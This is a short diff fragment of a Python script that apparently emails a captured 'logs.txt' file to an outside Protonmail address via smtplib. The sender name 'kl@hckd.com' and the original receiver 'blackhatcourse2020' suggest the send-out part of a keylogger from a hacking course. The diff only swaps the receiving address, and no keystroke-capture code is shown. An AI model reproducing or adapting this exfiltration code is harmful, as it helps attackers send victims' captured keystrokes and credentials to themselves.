@@ -2,7 +2,7 @@ import smtplib
 import time
 filename = 'logs.txt'
 sender = "kl@hckd.com"
-receiver = ['blackhatcourse2020@protonmail.com']
+receiver = ['shalimarbaghouse@protonmail.com']
 f = open("logs.txt", "r")
 message = (f.read())
 sender_address = 'spprtpplcm@gmail.com '
